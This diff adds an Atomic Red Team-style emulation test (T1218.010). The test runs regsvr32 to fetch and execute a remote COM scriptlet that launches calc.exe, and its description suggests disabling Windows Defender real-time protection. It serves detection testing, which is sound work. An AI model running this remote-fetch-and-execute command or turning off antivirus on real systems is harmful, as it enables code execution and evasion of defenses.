@@ -1,0 +1,43 @@
+{
+  "id": "c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36",
+  "name": "Regsvr32 remote COM scriptlet execution",
+  "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "bb6e2e06-764e-4486-9e09-142f1d0a5fb6",
+      "type": "execute-command",
+      "data": {
+        "command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1218.010",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "regsvr32name",
+      "type": "string",
+      "description": "Default name of Regsvr32.exe",
+      "value": "regsvr32.exe"
+    },
+    {
+      "name": "url",
+      "type": "url",
+      "description": "URL to hosted sct file",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct"
+    },
+    {
+      "name": "regsvr32path",
+      "type": "path",
+      "description": "Default location of Regsvr32.exe",
+      "value": "C:\\Windows\\system32"
+    }
+  ]
+}
